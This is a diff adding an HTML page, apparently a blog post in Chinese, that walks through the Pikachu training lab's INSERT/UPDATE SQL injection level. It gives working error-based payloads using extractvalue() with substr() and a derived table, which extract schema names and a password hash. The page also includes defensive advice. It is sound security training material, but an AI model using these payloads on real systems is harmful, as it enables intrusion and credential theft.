@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-SQL-Inject "insert/update"注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-SQL-Inject "insert/update"注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.28 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, SQL注入, insert注入, update注入, 报错注入, 32字符限制, extractvalue, 派生表</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - SQL-Inject</li>
+        <li><strong>题目名称：</strong>"insert/update"注入</li>
+        <li><strong>目标：</strong>理解数据写入（INSERT/UPDATE）场景下的 SQL 注入原理，掌握利用报错注入（Error-based）获取数据库信息的方法，并突破 MySQL 报错回显 32 字符与同表更新的底层限制。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>该关卡模拟了用户注册功能。后端代码未对用户输入进行过滤，直接将数据拼接到 <code>INSERT INTO</code> 语句中执行，形如 <code>INSERT INTO member (username, ...) VALUES ('$username', ...)</code>。因为参数被单引号包裹，攻击者需要闭合单引号，并通过逗号构造新的值列表来植入恶意 SQL 语句。由于 INSERT 语句在页面上没有数据查询回显，我们采用 <strong>报错注入（Error-based Injection）</strong>，利用 <code>extractvalue()</code> 或 <code>updatexml()</code> 函数故意制造 XPath 语法错误，将查询结果带出。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型与心路历程：</strong>
+        <ul>
+            <li><strong>F12抓包与Python脚本：</strong>由于是 POST 请求，通过 F12 抓包明确注册接口的参数列表。使用 Python 的 <code>requests.post()</code> 构造并发送注入载荷，便于修改和调试。</li>
+            <li><strong>报错注入技巧：</strong>经过测试，<code>updatexml</code> 在 POST 环境下注释符 <code>#</code> 失效，转为使用 <code>extractvalue</code> 配合 <code>-- </code>（双横线+空格）注释符，成功绕过语法限制。</li>
+            <li><strong>MySQL 32字符限制：</strong>在尝试提取 32 位的 MD5 密码哈希时，发现 <code>extractvalue</code> 报错回显有 32 字符的硬性限制，导致哈希被截断，正则匹配不到完整数据。</li>
+            <li><strong>同表更新限制：</strong>使用 <code>substr</code> 分段提取时，触发了 MySQL 的 <code>You can't specify target table 'member' for update in FROM clause</code> 错误。最终利用 <strong>派生表（Derived Table）</strong> 配合 <code>substr()</code> 函数，成功绕过所有限制，拿到完整的 MD5 密码哈希。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：抓包与参数分析</h3>
+        <p class="info-line"><span class="info-label">操作：</span>访问注册页面，填写账号密码等信息（用户名 vince，密码 123456 等），点击提交。按 F12 打开网络面板抓取请求。</p>
+        <p class="info-line"><span class="info-label">分析结果：</span>请求 URL 为 <code>/pikachu/vul/sqli/sqli_iu/sqli_reg.php</code>，请求方式为 POST。Payload 包含 <code>username</code>、<code>password</code>、<code>sex</code>、<code>phonenum</code>、<code>email</code>、<code>add</code>、<code>submit</code> 参数。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：漏洞探测（单引号报错）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 使用 Python 脚本将 <code>username</code> 修改为 <code>vince'</code> 并发送。</p>
+        <div class="payload-box">
+            <p><strong>回显：</strong> 页面报错 <code>You have an error in your SQL syntax; ... near '123456'),'girl'...</code>。</p>
+            <p><strong>说明：</strong> 报错信息完整暴露了 VALUES 列表的结构，证明单引号未被过滤，且注入点存在。</p>
+        </div>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：报错注入获取库名、表名、列名</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 使用 <code>extractvalue()</code> 配合逗号闭合构造 Payload。将 <code>username</code> 替换为以下代码：</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>vince', extractvalue(1,concat(0x7e,(select database()),0x7e)), '1', '1', '1', '1')-- </code></p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span></p>
+        <ul>
+            <li>查库名：<code>~pikachu~</code></li>
+            <li>查表名：<code>~httpinfo,member,message,users,x~</code>（因长度限制被截断，已确认存在 <code>member</code> 表）</li>
+            <li>查列名：<code>~id,username,pw,sex,phonenum,add~</code>（因长度限制被截断，已确认存在 <code>username</code> 和 <code>pw</code>）</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：提取密码的失败过程与限制分析</h3>
+        <p class="info-line"><span class="info-label">操作 1：</span> 尝试直接提取 <code>member</code> 表的 <code>pw</code> 字段。</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>vince', extractvalue(1,concat(0x7e,(select pw from member limit 0,1),0x7e)), '1', '1', '1', '1')-- </code></p>
+        </div>
+        <p class="info-line"><span class="info-label">结果：</span> 脚本无法匹配到 XPATH 报错信息。分析发现，MD5 哈希长度为 32 位，加上波浪号占位符总长度超过 32 字符。MySQL 对 <code>extractvalue</code> 的报错回显有 <strong>32 字符的硬性限制</strong>，导致数据被截断，无法通过前端页面直接获取完整哈希。</p>
+
+        <p class="info-line"><span class="info-label">操作 2：</span> 尝试使用 <code>substr</code> 分段提取。</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>vince', extractvalue(1,concat(0x7e,substr((select pw from member limit 0,1),1,16),0x7e)), '1', '1', '1', '1')-- </code></p>
+        </div>
+        <p class="info-line"><span class="info-label">结果：</span> 依然失败。报错信息显示 <code>You can't specify target table 'member' for update in FROM clause</code>。这是因为 MySQL 不允许在 INSERT/UPDATE 同一张表（member）时，在子查询中直接 SELECT 这张表的数据。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第五步：终极绕过与提取（派生表 + 分段提取）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 为了解决“32字符限制”和“同表更新限制”，使用 <strong>派生表（Derived Table）</strong> 技巧。将 <code>member</code> 表的数据包在 <code>as t</code> 里面，欺骗 MySQL 将其视为临时结果集。</p>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>vince', extractvalue(1,concat(0x7e,substr((select pw from (select pw from member limit 0,1) as t),1,16),0x7e)), '1', '1', '1', '1')-- </code></p>
+            <p><strong>分段查询：</strong> 分别查询 <code>substr(...,1,16)</code> 和 <code>substr(...,17,16)</code>，最后在 Python 脚本中拼接。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span> 前端成功报错并回显数据，Python 脚本提取到完整哈希：<code>e10adc3949ba59abbe56e057f20f883e</code>。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：POST 环境下注释符 <code>#</code> 失效。</strong> 在 POST 请求中，<code>#</code> 常常被服务器或 PHP 解析器当作锚点处理，无法注释后续 SQL。改用 <code>-- </code>（双横线加空格）并在 Python 字典中直接传递，成功解决。</li>
+        <li><strong>坑2：MySQL 报错注入的 32 字符硬性限制。</strong> <code>extractvalue</code> 和 <code>updatexml</code> 报错回显最多 32 个字符。MD5 哈希恰好占满 32 位，加上波浪号后超长被截断。解决方案是使用 <code>substr()</code> 函数分段提取。</li>
+        <li><strong>坑3：同表更新限制。</strong> 使用 <code>substr</code> 配合子查询时，MySQL 禁止在 INSERT/UPDATE 表 A 时，子查询直接 SELECT 表 A。解决方案是使用派生表：<code>select pw from (select pw from member limit 0,1) as t</code>。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>INSERT/UPDATE 注入核心：</strong> 攻击点位于数据写入语句中。需闭合单引号，通过逗号构造新的值列表（如 <code>'1', '1'</code>）来平衡语法，并注意注释符的兼容性。</li>
+        <li><strong>报错注入（Error-based Injection）：</strong> 利用数据库函数（如 <code>extractvalue</code>、<code>updatexml</code>）强制报错，将查询结果拼接在错误信息中返回。适用于无回显的 INSERT/UPDATE 场景。</li>
+        <li><strong>防御建议：</strong> 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；对用户输入进行严格的过滤和转义；对密码使用加盐的强哈希算法（如 bcrypt）进行存储。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
